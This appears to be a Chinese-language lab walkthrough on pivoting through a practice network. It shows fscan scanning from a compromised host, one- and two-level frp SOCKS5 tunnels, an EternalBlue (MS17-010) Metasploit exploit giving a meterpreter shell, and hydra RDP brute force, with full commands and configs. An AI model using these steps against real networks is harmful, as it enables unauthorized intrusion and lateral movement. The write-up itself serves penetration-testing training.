内网收集

得到22网段，既然发现了存在192.168.22.x/24 网段，所以尝试对 22 网段进行信息收集，这里使用fscan

上传fscan 到targ1服务器目录/tmp （如果有杀软容易寄）

./fscan -h 192.168.22.0/24 -o fscan.log

可以看到192.168.22.133是Target2，还是某个cms的站，80端口开发

有两种方式进行利用：

1.对 Target 2 80 端口进行端口转发。 2.使用反向代理，将Target 1 的网络通过vps代理出去。

代理转发—重点

使用frp方式。

frp存在服务端（frps）与客户端（frpc）， frps需要一直保持运行，转发方式通过客户端配置文件进行确定。

一级代理

配置服务端frps.ini

[common]
bind_addr = 0.0.0.0   # 在服务端上绑定的ip 
bind_port = 7000      # 在服务端上绑定的端口

启动服务端

./frps -c ./frps.ini

配置客户端（受控靶机）

这里就是被拿shell的target1，先像蚁剑传入frpc和frpc.ini

配置frpc.ini

[common]
server_addr = 192.168.1.133  # 指向frp服务端绑定的ip
server_port = 7000           # 指向frp服务端绑定的端口

[socks5]
remote_port = 1080           # 代理所使用的端口，会被转发到服务端
plugin = socks5              # 代理的类型

启动客户端

chmod +x frpc
./frpc -c ./frpc.ini

可以看到服务端显示连接成功

此时，我们就成功在kali和target1之间搭建了一个SOCKS5代理服务。

然后借助第三方工具，可以让计算机的其他应用使用这个socks5代理，如proxychains，proxifier

这里在Linux下使用proxychains为例，用vim编辑/etc/proxychains.conf ，将socks5代理服务器的地址指向frp服务端的地址。

然后我们在命令行前面加上proxychains 便可以应用此socks5代理

这里通过代理登录targ2的ssh，没有代理则访问不到22网段

(当然这个密码是我知道的) 爆破也是可以的

代理使用nmap继续扫

proxychains nmap -Pn -sT 192.168.22.133

浏览器设置socks5的代理即可访问target2的80站

代理ip写服务端的ip，端口是之前设置的1080

便可以成功访问 targ2的站

虽然这里浏览器能够正常访问了，但是在渗透的过程中常常会使用安全工具进行扫描或者漏洞利用，这些工具大部分没有预留走代理的配置，或者系统的代理往往不会生效，这种情况怎么办呢？

以下两个软件可以在win下使用，不多介绍了

二层代理——重点

(这里执行执行frp时，记得把蚁剑代理关闭)

现在如何用kali的1网段打到targ2的33网段，继续frp二级代理

目前我们有kali的1到centos的22网段的代理

那么继续搞一个 centos的22到ubuntu的33网段的代理

是不是就实现了从kali的1网段代理到ubuntu的33网段。

kali:1<---->centos:22
             centos:22<---->ubuntu:33

那么centos现在在中间是又当服务端，又当客户端。

我们一个个看：

1.kali服务端frps.ini 依然如旧

[common]
bind_addr = 0.0.0.0   # 在服务端上绑定的ip
bind_port = 7000      # 在服务端上绑定的端口

./frps -c ./frps.ini

2.centos客户端frpc.ini

[common]
server_addr = 192.168.1.133    # kali的frp服务端绑定的ip
server_port = 7000             # kali的frp服务端绑定的端口

[socks5_forward]
type = tcp                     # 所使用的协议类型
local_ip = 192.168.22.134      # 本地监听的ip地址（本地的ip）
local_port = 10808             # 要转发的本地端口
remote_port = 1080             # 要转发到的远程端口

./frpc -c ./frpc.ini

3.centos服务端frps.ini

[common]
bind_addr = 192.168.22.134   # centos上本地ip
bind_port = 7000             # centos的frp服务端绑定的端口

./frps -c ./frps.ini

4.ubuntu客户端frpc.ini

[common]
server_addr = 192.168.22.134 # 指向centos的服务端绑定的ip
server_port = 7000           # 指向centos的服务端绑定的端口

[socks5]
type = tcp
remote_port = 10808
plugin = socks5       # 代理的类型

./frpc -c ./frpc.ini

顺利连接

proxychains的ip和端口依然是 192.168.1.133 1080

用proxychains跑一下33网段的nmap

proxychains nmap -Pn -sT 192.168.33.33

顺利跑出

445 直接打永恒之蓝 还有3389远程桌面连接

靶机3 win7

用proxychains 打开msf

proxychains msfconsole

打永恒之蓝正向连接的payload

use exploit/windows/smb/ms17_010_psexec
set payload windows/meterpreter/bind_tcp
set RHOST 192.168.33.33
options
run

可以顺利shell

但是发现 frp的二层代理会很不稳定

直接爆破用户密码也可

proxychains hydra  192.168.33.33 rdp -l Administrator -P pass.txt -V

redesktop 远程连接

proxychains rdesktop 192.168.33.33

主要是练习frp代理搭建，所以就没很细
